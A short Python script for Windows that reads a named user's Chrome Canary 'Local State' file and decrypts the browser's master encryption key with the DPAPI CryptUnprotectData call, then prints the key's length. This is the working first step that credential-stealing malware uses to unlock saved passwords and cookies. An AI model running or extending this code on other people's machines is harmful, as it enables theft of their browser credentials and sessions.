import os
import json
import base64
import ctypes
from ctypes import wintypes

class DATA_BLOB(ctypes.Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', ctypes.POINTER(ctypes.c_char))
    ]

def unprotect_data(encrypted_bytes):
    blob_in = DATA_BLOB(len(encrypted_bytes), ctypes.cast(ctypes.c_char_p(encrypted_bytes), ctypes.POINTER(ctypes.c_char)))
    blob_out = DATA_BLOB()
    
    res = ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blob_in),
        None,
        None,
        None,
        None,
        0,
        ctypes.byref(blob_out)
    )
    if not res:
        raise RuntimeError("CryptUnprotectData failed")
    
    out_bytes = ctypes.string_at(blob_out.pbData, blob_out.cbData)
    ctypes.windll.kernel32.LocalFree(blob_out.pbData)
    return out_bytes

local_state_path = r"C:\Users\ishan\AppData\Local\Google\Chrome SxS\User Data\Local State"
with open(local_state_path, "r", encoding="utf-8") as f:
    local_state = json.load(f)

encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
encrypted_key = base64.b64decode(encrypted_key_b64)
# First 5 bytes are b'DPAPI'
if encrypted_key.startswith(b'DPAPI'):
    raw_key = encrypted_key[5:]
    decrypted_key = unprotect_data(raw_key)
    print("Master key decrypted successfully! Length:", len(decrypted_key))
else:
    print("Prefix is not DPAPI:", encrypted_key[:10])
